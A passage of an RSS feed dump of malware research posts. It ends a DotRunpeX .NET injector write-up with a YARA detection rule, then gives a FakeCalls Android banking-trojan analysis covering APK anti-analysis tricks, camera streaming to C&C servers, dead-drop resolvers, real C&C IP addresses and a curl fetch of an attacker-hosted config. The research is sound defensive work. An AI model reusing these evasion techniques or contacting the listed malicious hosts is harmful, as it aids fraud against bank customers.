\"68ae2ee5ed7e793c1a49cbf1b0dd7f5a3de9cb783b51b0953880994a79037326\" // injects Lokibot\n\t\thash5_Old = \"81763d8e3b42d07d76b0a74eda4e759981971635d62072c8da91251fc849b91e\" // injects SnakeKeylogger\n\tstrings:\n\t// Used ImplMap imports (PInvoke) \n\t\t$implmap1 = \"VirtualAllocEx\"\n\t\t$implmap2 = \"CreateProcess\"\n\t\t$implmap3 = \"CreateRemoteThread\"\n\t\t$implmap4 = \"Wow64SetThreadContext\"\n\t\t$implmap5 = \"Wow64GetThreadContext\"\n\t\t$implmap6 = \"RtlInitUnicodeString\"\n\t\t$implmap7 = \"NtLoadDriver\"\n\t\t$implmap8 = \"LoadLibrary\"\n\t\t$implmap9 = \"VirtualProtect\"\n\t\t$implmap10 = \"AdjustTokenPrivileges\"\n\t\t$implmap11 = \"GetProcAddress\"\n\t\t$modulerefKernel1 = \"Kernel32\"\n\t\t$modulerefKernel2 = \"kernel32\"\n\t\t$modulerefNtdll1 = \"Ntdll\"\n\t\t$modulerefNtdll2 = \"ntdll\"\n\n\t\t$regPath = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\TaskKill\" wide // Registry path for installing Sysinternals Procexp driver\n\t\t$rsrcName = \"BIDEN_HARRIS_PERFECT_ASSHOLE\" wide\n\t\t$koiVM1 = \"KoiVM\"\n\t\t$koiVM2 = \"#Koi\"\n\tcondition:\n\t\tuint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and ($regPath or $rsrcName or 1 of ($koiVM*)) and\n\t\t9 of ($implmap*) and 1 of ($modulerefKernel*) and 1 of ($modulerefNtdll*) \n}\n</pre>\n\n\n\n<h1 class=\"wp-block-heading\">References</h1>\n\n\n\n<ol type=\"1\">\n<li>KoiVM protector:&nbsp;<a href=\"https://github.com/yck1509/KoiVM\">https://github.com/yck1509/KoiVM</a></li>\n\n\n\n<li>Reflection in .NET:&nbsp;<a href=\"https://learn.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection\">https://learn.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection</a></li>\n\n\n\n<li>P/Invoke:&nbsp;<a href=\"https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke\">https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke</a></li>\n\n\n\n<li>D/Invoke:&nbsp;<a href=\"https://github.com/TheWover/DInvoke\">https://github.com/TheWover/DInvoke</a></li>\n\n\n\n<li>Backstab:&nbsp;<a href=\"https://github.com/Yaxser/Backstab\">https://github.com/Yaxser/Backstab</a></li>\n\n\n\n<li>MinHook:&nbsp;<a href=\"https://github.com/TsudaKageyu/minhook\">https://github.com/TsudaKageyu/minhook</a></li>\n\n\n\n<li>ClrMD:&nbsp;<a href=\"https://github.com/microsoft/clrmd\">https://github.com/microsoft/clrmd</a></li>\n\n\n\n<li>AsmResolver:&nbsp;<a href=\"https://github.com/Washi1337/AsmResolver\">https://github.com/Washi1337/AsmResolver</a></li>\n\n\n\n<li>OldRod:&nbsp;<a href=\"https://github.com/Washi1337/OldRod\">https://github.com/Washi1337/OldRod</a></li>\n</ol>\n\n\n\n<h1 class=\"wp-block-heading\">Tools to Download</h1>\n\n\n\n<ul>\n<li><strong>ImplMap2x64dbg</strong> (Password: \u201c<strong>CPR</strong>\u201d):\n<ul>\n<li><a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/ImplMap2x64dbg.7z\"> ImplMap2x64dbg.7z</a></li>\n</ul>\n</li>\n\n\n\n<li><strong>Invoke-DotRunpeXextract</strong> (Password: \u201c<strong>CPR</strong>\u201d):\n<ul>\n<li> <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Invoke-DotRunpeXextract.7z\">Invoke-DotRunpeXextract.7z</a></li>\n</ul>\n</li>\n</ul>\n\n\n<p>The post <a href=\"https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/\" rel=\"nofollow\">DotRunpeX &#8211; demystifying new virtualized .NET injector used in the wild</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "South Korean Android Banking Menace \u2013 FakeCalls",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "South Korean Android Banking Menace \u2013 FakeCalls"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/south-korean-android-banking-menace-fakecalls/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/south-korean-android-banking-menace-fakecalls/",
            "authors": [
                {
                    "email": "elism@checkpoint.com"
                }
            ],
            "author": "elism@checkpoint.com",
            "author_detail": {
                "email": "elism@checkpoint.com"
            },
            "published": "Tue, 14 Mar 2023 15:29:20 +0000",
            "published_parsed": [
                2023,
                3,
                14,
                15,
                29,
                20,
                1,
                73,
                0
            ],
            "tags": [
                {
                    "term": "Android Malware",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27597",
            "guidislink": false,
            "summary": "<p>Research by: Bohdan Melnykov, Raman Ladutska When malware actors want to enter the business, they can choose markets where their profit is almost guaranteed to be worth the effort \u2013 according to past results. The malware does not need to be high profile, just careful selection of the audience and the right market can be [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/south-korean-android-banking-menace-fakecalls/\" rel=\"nofollow\">South Korean Android Banking Menace \u2013 FakeCalls</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>Research by: Bohdan Melnykov, Raman Ladutska When malware actors want to enter the business, they can choose markets where their profit is almost guaranteed to be worth the effort \u2013 according to past results. The malware does not need to be high profile, just careful selection of the audience and the right market can be [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/south-korean-android-banking-menace-fakecalls/\" rel=\"nofollow\">South Korean Android Banking Menace \u2013 FakeCalls</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p><em>Research by: Bohdan Melnykov, Raman Ladutska</em></p>\n\n\n\n<p>When malware actors want to enter the business, they can choose markets where their profit is almost guaranteed to be worth the effort \u2013 according to past results. The malware does not need to be high profile, just careful selection of the audience and the right market can be enough.</p>\n\n\n\n<p>This \u201cstay-low-aim-high\u201d approach is what the&nbsp;<strong>Check Point Research</strong>&nbsp;team saw in our recent&nbsp;<strong>Android</strong>&nbsp;malware research. We encountered an Android&nbsp;<strong>Trojan</strong>&nbsp;named&nbsp;<strong>FakeCalls</strong>, a malware that can masquerade as&nbsp;<strong>one of more than 20 financial applications</strong>&nbsp;and imitate phone conversations with bank or financial service employees \u2013 this attack is called&nbsp;<strong>voice phishing</strong>. FakeCalls malware targeted the&nbsp;<strong>South</strong>&nbsp;<strong>Korean</strong>&nbsp;market and possesses the functionality of a Swiss army knife, of being able not only to conduct its primary aim but also to extract private data from the victim\u2019s device.</p>\n\n\n\n<p>Voice phishing attacks have a long history in the South Korean market. According to the&nbsp;<a href=\"https://www.data.go.kr/data/15063815/fileData.do\">report</a>&nbsp;published on the South Korean government website, financial losses due to voice phishing constituted approximately&nbsp;<strong>600 million USD</strong>&nbsp;in 2020, with the number of&nbsp;<a href=\"https://it.chosun.com/site/data/html_dir/2020/09/28/2020092802480.html\">victims</a>&nbsp;reaching as many as&nbsp;<strong>170,000 people</strong>&nbsp;in the period from 2016 to 2020.</p>\n\n\n\n<p>We discovered more than&nbsp;<strong>2500</strong>&nbsp;samples of the FakeCalls malware that used a variety of combinations of mimicked financial organizations and implemented&nbsp;<strong>anti-analysis</strong>&nbsp;(also called&nbsp;<strong>evasions</strong>) techniques. The malware developers paid special attention to the protection of their malware, using several unique evasions that we had not previously seen in the wild.</p>\n\n\n\n<p>In our report, we describe all of the encountered anti-analysis techniques and show how to mitigate them, dive into the key details of the malware functionality and explain how to stay protected from this and similar threats.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Voice phishing</h1>\n\n\n\n<p>Before we get to the technical details, let\u2019s discuss how voice phishing works in the example of FakeCalls malware.</p>\n\n\n\n<p>The idea behind voice phishing is to trick the victim into thinking that there is a real bank employee on the other side of the call. As the victim thinks that the application in use is an internet-banking application (or payment system application) of a real financial institution, there is no reason to be suspicious of an offer to apply for a loan with a lower interest rate \u2013 which is fake, of course. At this step, the malware actors can lay the necessary groundwork to understand how to approach the victim in the best way possible.</p>\n\n\n\n<p>At the point where conversation actually happens, the phone number belonging to the malware operators, unknown to the victim, is replaced by a real bank number. Therefore, the victim is under the impression that the conversation is made with a real bank and its real employee. Once the trust is established, the victim is tricked into \u201cconfirming\u201d the credit card details in the hope of qualifying for the (fake) loan.</p>\n\n\n\n<p>This is the principal scheme of the attack:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27598\" height=\"545\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image2-1024x545.png\" width=\"1024\" /></figure>\n\n\n\n<p class=\"has-text-align-center\"><em>Image 1 \u2013 The key steps of a voice phishing attack.</em></p>\n\n\n\n<p>Targeted financial institutions are selected from amongst the largest and most prominent ones in the banking sector: strong repay capacity ratings as evaluated by the South Korean government and major world agencies, with billions of South Korean Won (KWR) revenue (equal to millions of the United States dollar (USD). Mimicking applications from such companies increases the chances of attracting suitable victims.</p>\n\n\n\n<p>When victims install the FakeCalls malware, they have no reason to suspect that some hidden catches are present in the \u201ctrustworthy\u201d internet-banking application from a solid organization.</p>\n\n\n\n<p>At step 2 of voice phishing attack, instead of a phone conversation with a malware operator, a pre-recorded audio-track can be played imitating instructions from the bank. Several different tracks are embedded into different malware samples corresponding to different financial organizations.</p>\n\n\n\n<p>One way or another, malware operators get the private financial data of the victim which means that the aim of attack is achieved successfully.</p>\n\n\n\n<p><strong>Technical details</strong></p>\n\n\n\n<p>In this section we describe the anti-analysis techniques as well as the process of dropping the final payload and the details of FakeCalls\u2019 network communication.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Anti-analysis techniques</h2>\n\n\n\n<p>There are three unique anti-analysis techniques encountered in different malware samples that we did not observe previously in the wild. We took the following malware sample and analyzed all three evasions we encountered inside:</p>\n\n\n\n<p><em><strong>f8823780d2822307e995528bd7a34a1735e66bd2fe22404e02053cb92b0a56cb</strong></em></p>\n\n\n\n<p>If you try loading such a sample into analysis tools, they fail, as shown on this JEB Pro example:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27603\" height=\"451\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image3-2-1024x451.png\" width=\"1024\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 2 \u2013 FakeCalls failed to load in JEB Pro.</em></p>\n\n\n\n<p>Let\u2019s dissect and mitigate each of the anti-analysis techniques one by one, to finally be able to load and analyze the malicious payload.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Multi-Disk</h3>\n\n\n\n<p>The first evasion is called \u201cMulti-Disk.\u201d We clearly understand that APK cannot be split into multi-disk archives, so we check this information in the APK by analyzing the ZIP header data.</p>\n\n\n\n<p>The necessary entry is the central directory file header. The end of this record&nbsp;<strong><a href=\"https://docs.fileformat.com/compression/zip/#end-of-central-directory-record\"><u>EOCD</u></a></strong>&nbsp;contains information about disk count.</p>\n\n\n\n<figure class=\"wp-block-table\"><table><thead><tr><th>Offset</th><th>Bytes</th><th>Description</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>End of central directory signature = 0x06054b50</td></tr><tr><td>4</td><td>2</td><td>Number of this disk (or 0xffff for ZIP64)</td></tr><tr><td>6</td><td>2</td><td>Disk where central directory starts (or 0xffff for ZIP64)</td></tr><tr><td>8</td><td>2</td><td>Number of central directory records on this disk (or 0xffff for ZIP64)</td></tr><tr><td>10</td><td>2</td><td>Total number of central directory records (or 0xffff for ZIP64)</td></tr><tr><td>12</td><td>4</td><td>Size of central directory (bytes) (or 0xffffffff for ZIP64)</td></tr><tr><td>16</td><td>4</td><td>Offset of start of central directory, relative to start of archive (or 0xffffffff for ZIP64)</td></tr><tr><td>20</td><td>2</td><td>Comment length (<em>n</em>)</td></tr><tr><td>22</td><td><em>n</em></td><td>Comment</td></tr></tbody></table></figure>\n\n\n\n<p>EOCD marks the end of ZIP so the needed byte sequence can be found at the end of the file:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27604\" height=\"231\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image4.png\" width=\"599\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 3 \u2013 Selected sequence at the end of the file.</em></p>\n\n\n\n<p>The processed struct looks like this:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27605\" height=\"174\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image5.png\" width=\"580\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 4 \u2013 Values of the structure fields.</em></p>\n\n\n\n<p>Based on the very large values in the disk number fields, we understand that malware developers edited these fields and entries. This means that the disk numbers should be set to 0, and the disk entries to the value equal to the directory entries: 1075.</p>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>AndroidManifest</strong></h3>\n\n\n\n<p>The second evasion goes by the name \u201cAndroidManifest.\u201d The AndroidManifest file must start with specific magic numbers (0x00080003 or 0x00080001) but our file starts from 0x00080000.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27608\" height=\"116\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image6.png\" width=\"572\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 5 \u2013 Magic number at the beginning of the AndroidManifest file.</em></p>\n\n\n\n<p>Besides the magic number, the file contains other things that break the decoding process.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27607\" height=\"430\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image7-1.png\" width=\"585\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 6 \u2013 Values of the fields in the STRINGCHUNK structure.</em></p>\n\n\n\n<p>The value of the&nbsp;<strong>scStypePoolOffset</strong>&nbsp;field points from the actual AndroidManifest file. Based on the&nbsp;<strong>scStyleCount</strong>&nbsp;field, we see that file shouldn&#8217;t contain &#8220;styles\u201d, and the value of this field should be 0x00000000. The next thing we look at is&nbsp;<strong>scStringCount.</strong>&nbsp;The value here looks normal, except for the moment when string analysis occurs. The image below informs us that the offset of the last string is pointing out of the file.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27609\" height=\"456\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image8.png\" width=\"587\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 7 \u2013Wrong last string offset in the array.</em></p>\n\n\n\n<p>We see that the string \u201ctheme\u201d is wrongly interpreted as an offset value in the last element of the array, number 87. This means that the value of the&nbsp;<strong>scStringCount</strong>&nbsp;should be less by 1, i.e., set to 86.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Files</h3>\n\n\n\n<p>The third and the final evasion is called simply \u201cFiles.\u201d This technique is related to the files inside the APK.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27610\" height=\"378\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image9-1024x378.png\" width=\"1024\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 8 \u2013 Files inside the APK.</em></p>\n\n\n\n<p>Developers added a large number of files inside nested directories to the asset folder. As a result, the length of the file name and path is over 300 characters.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27611\" height=\"706\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image10.png\" width=\"791\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 9 \u2013 Length of the file name (selected in the screenshot).</em></p>\n\n\n\n<p>These files break the logic of tools that cannot remap file locations and may fail during APK decompilation. However, after all the previous fixes, such files can be manually removed from the APK as they are not required anymore.</p>\n\n\n\n<p>In the end, the resulting APK file can be processed inside typical analysis tools.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27612\" height=\"666\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image11-1024x666.png\" width=\"1024\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 10 \u2013 FakeCalls successfully loaded in JEB Pro.</em></p>\n\n\n\n<h2 class=\"wp-block-heading\">Inside the malware</h2>\n\n\n\n<p>FakeCalls payload is not launched at once. Instead, the dropper is used as an intermediate step.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Dropping process</h3>\n\n\n\n<p>The malware registers&nbsp;<em><strong>BroadcastReciever</strong></em>&nbsp;for the application installation events. This receiver launches the dropped APK later in the process.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27613\" height=\"671\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image12.png\" width=\"978\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 11 \u2013 Function with the&nbsp;<strong>BroadcastReciever</strong>&nbsp;register functionality.</em></p>\n\n\n\n<p>Then malware shows a button to click to start the payload installation.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27614\" height=\"1024\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image13-576x1024.png\" width=\"576\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 12 \u2013 Button saying \u201cClick Install Setup\u201d in Korean.</em></p>\n\n\n\n<p>The APK is located inside the asset folder and is copied during the process of loading the view components.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27615\" height=\"513\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image14.png\" width=\"810\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 13 \u2013 Code responsible for copying the APK.</em></p>\n\n\n\n<p>When the payload is successfully dropped, the malware launches the application with the configuration that it gets during the runtime.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27616\" height=\"564\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image15.png\" width=\"865\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 14 \u2013 Setting up the parameters when launching the application.</em></p>\n\n\n\n<h3 class=\"wp-block-heading\">Live stream capture</h3>\n\n\n\n<p>FakeCalls malware also has a possibility to capture live audio and video streams from the device\u2019s camera to C&amp;C servers with the help of open source library:<br /><a href=\"https://github.com/pedroSG94/rtmp-rtsp-stream-client-java\">https://github.com/pedroSG94/rtmp-rtsp-stream-client-java</a></p>\n\n\n\n<p>The command processing method has a command called \u201cstream\u201d:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27617\" height=\"350\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image16.png\" width=\"669\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 15 \u2013 Option in the code enabling capture of live streams.</em></p>\n\n\n\n<p>The corresponding method starts an audio or video service, or stops them, depending on the \u201cstate\u201d variable value received from the C&amp;C server.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27618\" height=\"738\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image17.png\" width=\"727\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 16 \u2013 Code to capture live streams.</em></p>\n\n\n\n<p>Upon the creation of video service, the&nbsp;<em><strong>RtspCamera2</strong></em>&nbsp;object is initialized by setting the authorization details and audio/video configuration (bitrate, fps, noise cancellation, etc.).</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27619\" height=\"263\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image18.png\" width=\"682\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 17 \u2013 Initialization of&nbsp;<strong>RtspCamera2</strong></em>&nbsp;object.</p>\n\n\n\n<p>Then the malware selects the front camera and starts streaming to C&amp;C server which will be stopped after 5 minutes.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27620\" height=\"353\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image19-1024x353.png\" width=\"1024\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 18 \u2013 Code lunching live streaming to C&amp;C server.</em></p>\n\n\n\n<p>FakeCalls may receive a command from C&amp;C server to switch the camera during the live streaming.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Network communication</h3>\n\n\n\n<p>The malware developers implemented several ways to keep their real&nbsp;<strong>Command-and-Control</strong>&nbsp;(C&amp;C) servers hidden: reading the data via&nbsp;<strong>dead drop resolvers</strong>&nbsp;in Google Drive or using an arbitrary Web server. Dead Drop Resolver is a technique when malicious content is stored on legitimate web services. Inside malicious domains and IP addresses are hidden to disguise the communication with real C&amp;C servers. We have identified more than 100 unique IP addresses by processing the data from dead drop resolvers.</p>\n\n\n\n<h4 class=\"wp-block-heading\">Google Drive</h4>\n\n\n\n<p>The first variant is reading the configuration via Google Drive: the malware contains an encrypted string with a link to Google Drive where the file is stored.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27621\" height=\"94\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image20.png\" width=\"981\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 19 \u2013 Link to Google Drive inside the FakeCalls malware.</em></p>\n\n\n\n<p>The name of the file is encrypted with AES.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27622\" height=\"792\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image21.png\" width=\"1025\" /></figure></div>\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27623\" height=\"287\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image22-1024x287.png\" width=\"1024\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 20 \u2013 The code to get the encrypted file name from Google Drive.</em></p>\n\n\n\n<p>After reading the file name, FakeCalls decrypts it with a hardcoded AES key and gets the real C&amp;C configuration:</p>\n\n\n\n<p>SERVER1_156.245.21.38-SERVER2_156.245.12.211-SERVER3_154.38.113.162-SERVER4_154.197.48.72-SERVER5_154.197.48.125-SERVER6_154.197.48.195-SERVER7_206.119.82.78-SERVER8_154.23.182.63-SERVER9_154.197.48.93-SERVER10_154.197.48.212-SERVERLK_127.0.0.1</p>\n\n\n\n<h4 class=\"wp-block-heading\">Fetch from alternative</h4>\n\n\n\n<p>The other variant to communicate with C&amp;C servers is when the malware has hardcoded an encrypted link to a specific resolver that contains a document with an encrypted server configuration.</p>\n\n\n\n<p>We used the following sample for the analysis of this network communication method:<br /><em><strong>4a422047bc0a2ca692b33a80740ab64a5bbc325c348d3d4eea0f304d3c256e03</strong></em></p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27624\" height=\"331\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image23-1024x331.png\" width=\"1024\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 21 \u2013 The code to perform a request to the arbitrary C&amp;C resolution server.</em></p>\n\n\n\n<p>$ curl https://www.daebak222.com/huhu/admin.txt</p>\n\n\n\n<p>{</p>\n\n\n\n<p>&#8220;a01&#8221;: &#8220;eWVlYWIrPj5mZmY_dXB0c3B6IyMjP3J-fA==&#8221;,</p>\n\n\n\n<p>&#8220;b05&#8221;: &#8220;Y2ViYWIrPj4gICI_IyAjPykpPyAlKSspIiMjPn14Z3Q=&#8221;,</p>\n\n\n\n<p>&#8220;a07&#8221;: &#8220;eWVlYWIrPj4gKSM_ICc_JSM_ICkrJCEkJD55ZHlkPnB1fHh_P2VpZQ==&#8221;</p>\n\n\n\n<p>}</p>\n\n\n\n<p>The first element is a new server address, the second one is the address of a stream server used for live streams capture, and the last one is a link to a new dead drop resolver.</p>\n\n\n\n<p>The malware decrypts all the data pieces and stores them for future use:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27625\" height=\"190\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/UU3FQ2TM9G-image24.png\" width=\"494\" /></figure></div>\n\n\n<p class=\"has-text-align-center\"><em>Image 22 \u2013 The code for decrypting the information received from the server.</em></p>\n\n\n\n<h1 class=\"wp-block-heading\">Protections</h1>\n\n\n\n<p>Check Point\u2019s&nbsp;<a href=\"https://www.checkpoint.com/harmony/mobile-security/mobile/\">Harmony Mobile</a>&nbsp;Prevents malware from infiltrating mobile devices by detecting and blocking the download of malicious apps in real-time. Harmony Mobile\u2019s unique network security infrastructure \u2013 On-device Network Protection \u2013 allows you to stay ahead of emerging threats by extending Check Point\u2019s industry-leading network security&nbsp;<a href=\"https://www.checkpoint.com/quantum/maestro-hyperscale-network-security/\">technologies</a>&nbsp;to mobile devices.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Threat Emulation Protections</h1>\n\n\n\n<ul>\n<li>Banking.Andorid.FakeCalls.TC.*</li>\n\n\n\n<li>FakeCalls.TC.*</li>\n</ul>\n\n\n\n<h1 class=\"wp-block-heading\">Conclusion</h1>\n\n\n\n<p>In the FakeCalls malware case, the developers decided not to leave any aspect of their operations to chance. They selected a profitable&nbsp;<strong>voice phishing</strong>&nbsp;market in South Korea where past results proved to bring tremendous value for cybercrime operators, harvesting approximately&nbsp;<strong>600 million USD</strong>&nbsp;from unsuspecting victims in 2020. The coverage of&nbsp;<strong>170,000 victims</strong>&nbsp;in the period of 5 years from 2016 to 2020 only added fuel to the mix.</p>\n\n\n\n<p>But the story did not stop there. The malware developers took special care with the technical aspects of their creation as well implementing several unique and effective&nbsp;<strong>anti-analysis</strong>&nbsp;techniques. In addition, they devised mechanisms for&nbsp;<strong>disguised</strong>&nbsp;resolution of the&nbsp;<strong>Command-and-Control</strong>&nbsp;servers behind the operations.</p>\n\n\n\n<p>This case shows the utmost importance of researching malware that is active in just a single country out of almost 200 in the world. The tricks and approaches used in this particular malware can be re-used in other applications targeting other markets around the globe. There is no physical distance in a digital sphere, the information spreads rapidly and we must react quickly in an ever-changing malware landscape.</p>\n\n\n\n<p>The&nbsp;<strong>Check Point Research</strong>&nbsp;team stays vigilant and ready to adapt to the upcoming challenges.</p>\n\n\n\n<h1 class=\"wp-block-heading\">IOCs</h1>\n\n\n\n<h2 class=\"wp-block-heading\">Hashes</h2>\n\n\n\n<p>The list of hashes below is not excessive by any 